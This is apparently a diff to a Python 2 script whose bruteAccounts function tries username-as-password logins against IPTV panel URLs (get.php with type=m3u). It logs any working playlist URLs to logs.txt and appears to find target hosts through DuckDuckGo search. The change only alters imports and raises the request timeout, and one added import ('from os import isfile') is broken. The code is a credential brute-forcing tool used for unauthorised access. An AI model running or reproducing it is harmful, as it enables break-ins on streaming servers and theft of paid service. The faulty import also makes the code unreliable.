@@ -2,9 +2,8 @@ try:
     from requests import get
     from urlparse import urlparse
     from duckduckgo import search
-    from tqdm import tqdm
     from sys import argv
-    from time import sleep
+    from os import isfile
 except ImportError as e:
     print str(e) 
 
@@ -78,7 +77,7 @@ def bruteAccounts(urls,comboFile):
         for url in urls:
             try:
                 accountToTry = "http://%s/get.php?username=%s&password=%s&type=m3u&output=ts" %(url.strip(), user.strip(), user.strip())
-                if "#EXTINF:0" in get(accountToTry, timeout=5, stream=True).text:
+                if "#EXTINF:0" in get(accountToTry, timeout=15, stream=True).text:
                     print "[+] Playlist URL found: %s" %(accountToTry)
                     f = open("logs.txt", "a")
                     f.write("%s\n" %(accountToTry))
